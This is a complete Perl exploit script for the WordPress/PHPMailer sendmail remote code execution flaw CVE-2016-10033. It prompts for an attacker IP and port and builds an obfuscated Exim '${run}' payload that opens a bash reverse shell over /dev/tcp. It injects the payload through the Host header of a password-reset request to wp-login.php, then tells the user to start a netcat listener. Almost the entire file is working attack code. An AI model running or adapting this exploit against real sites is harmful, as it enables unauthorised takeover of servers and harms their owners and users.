#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;

# Global Variables
my $url = 0;
$url = $ARGV[0] or help();

# Display The Header
header();

# Run The PoC
exploit($url);


sub header {
    print "\n\n";
    my $title = "=================================[ Wordpress Sendmail RCE - CVE-2016-10033 ]=================================";
    
    print qq{
$title
            
   Reporter : Dawid Golunski
       Date : 2017-01-02
        CVE : CVE-2016-10033
            
Description :

PHPMailer before 5.2.18 might allow remote attackers to
pass extra parameters to the mail command and consequently
execute arbitrary code via a \\" (backslash double quote) in a
crafted Sender property.


};
    print "="x(length($title)) . "\n\n";
}

sub help {
    print "\n";
    print qq {  
        # Usage : perl $0 <url>        
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my ( $url ) = @_;
    my $browser = 0;
    my $useragent = '';
    my $request = 0;
    my $response = 0;
    my $proxy = 0;
    my $vulnerable = 1;
    my $timeout = 30;
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Ask User For Values
    my $attacker_ip = getInput("Please Enter The IP Address To Which The Server Will Backconnect To : ");
    my $attacker_port = getInput("Please Enter The Port On Which The Server Will Backconnect To [$attacker_ip] : ");
    my $payload = buildPayload("(sleep 10s && nohup bash -i >/dev/tcp/'$attacker_ip'/'$attacker_port' 0<&1 2>&1) &");
    
    ### Build/send the requests

    # Request : EXPLOIT1
    print "[*] Sending RCE Payload By Host Header On : /wp-login.php?action=lostpassword\n";
    $request = buildRequest($url . "wp-login.php?action=lostpassword", "POST", "user_login=admin&wp-submit=Get+New+Password", "application/x-www-form-urlencoded");
    
    # Inject The Host Header With The Attacker Host
    $request->headers("Host" => $payload);
    
    $response = $browser->request($request);
    print "\t => " . $request->uri . " (" . $response->code . ")\n\n";
    
    if($response->code !~ /40[0-9]/) {
        print "[*] Exploit Sent, Run The Following Command To Have A Shell : nc -lvp $attacker_port\n";
    } else {
        print "[-] Bad Status Code Received .\n";
    }
}

sub buildPayload {
    my ( $command ) = @_;
    my $formatted_command = 0;
    
    $command = '${run{' . $command . '}}';
    
    # Convert Slashes
    $command =~ s/\//\${substr{0}{1}{\$spool_directory}}/gi;
    
    # Convert Spaces
    $command =~ s/ /\${substr{10}{1}{\$tod_log}}/gi;
    
    # Build The Final Value
    $formatted_command = 'target(any -froot@localhost -be ' . $command . ' null)';
    
    print "\n\t=> [RCE PAYLOAD] : $formatted_command\n\n";
    
    return $formatted_command;
}

sub getInput {
    my ( $text ) = @_;
    my $input = 0;
    
    while(!$input) {
        print "\n$text : ";
        $input = <STDIN>;
        chomp $input;
        print "\n";
    }
    
    return $input;
}
